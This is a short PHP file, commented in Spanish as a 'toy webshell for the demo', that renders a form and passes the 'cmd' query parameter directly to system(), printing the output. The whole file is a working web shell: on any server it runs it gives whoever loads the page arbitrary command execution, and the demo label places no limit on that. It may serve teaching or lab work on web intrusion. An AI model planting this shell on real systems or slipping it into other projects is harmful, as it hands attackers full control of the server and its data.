<?php
// webshell de juguete, para la demo. ejecuta lo que le pases en el cuadro de texto
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>shell.php</title></head>
<body>
<form method="get">
    <input type="text" name="cmd" value="<?php echo htmlspecialchars($cmd); ?>" placeholder="id" size="40">
    <input type="submit" value="Ejecutar">
</form>
<?php if ($cmd !== ''): ?>
<pre><?php system($cmd); ?></pre>
<?php endif; ?>
</body>
</html>
